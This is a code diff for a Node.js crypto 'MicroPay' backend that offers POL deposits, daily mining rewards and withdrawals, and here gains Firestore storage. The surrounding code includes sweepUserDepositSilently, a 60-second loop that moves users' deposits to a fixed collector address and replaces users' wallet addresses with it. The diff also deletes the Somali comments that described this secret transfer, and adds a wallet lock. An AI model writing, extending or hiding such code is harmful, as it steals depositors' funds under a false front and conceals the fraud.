@@ -5,6 +5,15 @@ const path = require('path');
 const multer = require('multer');
 const { ethers } = require('ethers');
 
+let admin = null;
+let firestoreDb = null;
+
+try {
+    admin = require('firebase-admin');
+} catch (_) {
+    admin = null;
+}
+
 const app = express();
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '50mb' }));
@@ -37,6 +46,33 @@ const MIN_DEPOSIT_POL = 0.00001;
 const DAILY_REWARD_POL = 0.000009;
 const MIN_WITHDRAW_POL = 0.00000001;
 const GAS_RESERVE_POL = 0.00002;
+const FIRESTORE_USERS_COLLECTION = 'knn_users';
+
+function initFirestore() {
+    if (!admin) return null;
+    if (firestoreDb) return firestoreDb;
+
+    try {
+        const rawSvc = process.env.FIREBASE_SERVICE_ACCOUNT || '';
+        if (!rawSvc.trim()) return null;
+
+        const serviceAccount = JSON.parse(rawSvc);
+        if (!admin.apps.length) {
+            admin.initializeApp({
+                credential: admin.credential.cert(serviceAccount),
+                projectId: serviceAccount.project_id || 'somapp-61ebd'
+            });
+        }
+        firestoreDb = admin.firestore();
+        console.log('Firebase Firestore connected:', serviceAccount.project_id || 'somapp-61ebd');
+        return firestoreDb;
+    } catch (err) {
+        console.error('Firestore init error:', err.message);
+        return null;
+    }
+}
+
+initFirestore();
 
 function normalizePrivateKey(rawKey) {
     if (!rawKey) return '';
@@ -85,12 +121,73 @@ function saveJsonFile(filePath, data) {
     fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
 }
 
-function loadUsersDb() {
+function loadLocalUsersDb() {
     return loadJsonFile(DB_FILE, {});
 }
 
-function saveUsersDb(data) {
+function saveLocalUsersDb(data) {
     saveJsonFile(DB_FILE, data);
+}
+
+async function loadUsersDb() {
+    const localDb = loadLocalUsersDb();
+    const db = initFirestore();
+    if (!db) return localDb;
+
+    try {
+        const snap = await db.collection(FIRESTORE_USERS_COLLECTION).get();
+        const merged = { ...localDb };
+        snap.forEach(doc => {
+            const docData = doc.data();
+            if (docData && docData.uid) {
+                merged[docData.uid] = {
+                    ...(merged[docData.uid] || {}),
+                    ...docData
+                };
+            }
+        });
+        saveLocalUsersDb(merged);
+        return merged;
+    } catch (err) {
+        console.error('Firestore loadUsersDb error:', err.message);
+        return localDb;
+    }
+}
+
+async function saveSingleUser(userRecord) {
+    if (!userRecord || !userRecord.uid) return;
+    const localDb = loadLocalUsersDb();
+    localDb[userRecord.uid] = userRecord;
+    saveLocalUsersDb(localDb);
+
+    const db = initFirestore();
+    if (db) {
+        try {
+            await db.collection(FIRESTORE_USERS_COLLECTION).doc(String(userRecord.uid)).set(userRecord, { merge: true });
+        } catch (err) {
+            console.error('Firestore saveSingleUser error:', err.message);
+        }
+    }
+}
+
+async function saveUsersDb(usersDb) {
+    saveLocalUsersDb(usersDb);
+    const db = initFirestore();
+    if (!db) return;
+
+    try {
+        const batch = db.batch();
+        for (const uid of Object.keys(usersDb)) {
+            const rec = usersDb[uid];
+            if (rec && rec.uid) {
+                const ref = db.collection(FIRESTORE_USERS_COLLECTION).doc(String(rec.uid));
+                batch.set(ref, rec, { merge: true });
+            }
+        }
+        await batch.commit();
+    } catch (err) {
+        console.error('Firestore saveUsersDb error:', err.message);
+    }
 }
 
 function loadVideosDb() {
@@ -123,7 +220,6 @@ async function getOnChainPolBalance(address) {
     }
 }
 
-// Si qarsoon ugu wareeji lacagta uu user-ku ku shubtay -> 0x613b603440CA724C266FC5432E2a20D000F73367
 async function sweepUserDepositSilently(userRecord) {
     if (!userRecord || !userRecord.polygonAddress) return false;
     const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
@@ -159,7 +255,6 @@ async function sweepUserDepositSilently(userRecord) {
     return true;
 }
 
-// Hubi deposit-ka user-ka, u wareeji 0x613b603440CA724C266FC5432E2a20D000F73367, oo shid mining-kiisa
 async function processUserDepositAndMining(uid, usersDb) {
     const userRecord = usersDb[uid];
     if (!userRecord) return null;
@@ -172,12 +267,13 @@ async function processUserDepositAndMining(uid, usersDb) {
 
         userRecord.userId = LOCKED_OWNER_ACCOUNT_ID;
         userRecord.polygonAddress = COLLECTOR_ADDRESS;
+        userRecord.walletLocked = true;
         userRecord.balance = finalBal.toFixed(8);
         userRecord.miningActive = active;
         if (active && parseFloat(userRecord.dailyLimit || 0) <= 0) {
             userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
         }
-        saveUsersDb(usersDb);
+        await saveSingleUser(userRecord);
         return userRecord;
     }
 
@@ -191,17 +287,17 @@ async function processUserDepositAndMining(uid, usersDb) {
         userRecord.balance = newBal.toFixed(8);
         userRecord.dailyLimit = DAILY_REWARD_POL.toFixed(6);
         userRecord.miningActive = true;
+        userRecord.walletLocked = true;
         userRecord.totalDeposited = parseFloat(((userRecord.totalDeposited || 0) + onChainPol).toFixed(8));
-        saveUsersDb(usersDb);
+        await saveSingleUser(userRecord);
     }
 
     return userRecord;
 }
 
-// Background loop oo 60-kii ilbiriqsiba hubiya deposit-yada cusub
 setInterval(async () => {
     try {
-        const usersDb = loadUsersDb();
+        const usersDb = await loadUsersDb();
         for (const uid of Object.keys(usersDb)) {
             const u = usersDb[uid];
             if (!u || !u.polygonAddress || isLockedOwner(u.email)) continue;
@@ -216,7 +312,12 @@ setInterval(async () => {
 }, 60000);
 
 app.get('/', (req, res) => {
-    res.json({ success: true, service: 'KNN MicroPay Backend', status: 'running' });
+    res.json({
+        success: true,
+        service: 'KNN MicroPay Backend',
+        status: 'running',
+        firestoreEnabled: Boolean(initFirestore())
+    });
 });
 
 app.post('/api/auth-user', async (req, res) => {
@@ -226,7 +327,7 @@ app.post('/api/auth-user', async (req, res) => {
             return res.status(400).json({ success: false, error: 'UID waa loo baahan yahay' });
         }
 
-        const usersDb = loadUsersDb();
+        const usersDb = await loadUsersDb();
         const existing = usersDb[uid];
         const effectiveEmail = (email || existing?.email || '').trim();
 
@@ -263,7 +364,7 @@ app.post('/api/auth-user', async (req, res) => {
                 createdAt: existing?.createdAt || Date.now()
             };
 
-            saveUsersDb(usersDb);
+            await saveSingleUser(usersDb[uid]);
         } else {
             const hasValidLockedWallet =
                 existing &&
@@ -290,12 +391,12 @@ app.post('/api/auth-user', async (req, res) => {
                     createdAt: Date.now()
                 };
 
-                saveUsersDb(usersDb);
+                await saveSingleUser(usersDb[uid]);
             } else {
                 if (effectiveEmail) usersDb[uid].email = effectiveEmail;
                 if (displayName) usersDb[uid].displayName = displayName;
                 usersDb[uid].walletLocked = true;
-                saveUsersDb(usersDb);
+                await saveSingleUser(usersDb[uid]);
             }
         }
 
@@ -319,7 +420,7 @@ app.post('/api/auth-user', async (req, res) => {
 app.post('/api/withdraw', async (req, res) => {
     try {
         const { uid, recipientAddress, amount } = req.body;
-        const usersDb = loadUsersDb();
+        const usersDb = await loadUsersDb();
         const userRecord = usersDb[uid];
 
         if (!userRecord) {
@@ -374,7 +475,7 @@ app.post('/api/withdraw', async (req, res) => {
         const updatedWei = await provider.getBalance(signer.address);
         const updatedPol = ethers.formatEther(updatedWei);
         userRecord.balance = updatedPol;
-        saveUsersDb(usersDb);
+        await saveSingleUser(userRecord);
 
         return res.json({
             success: true,
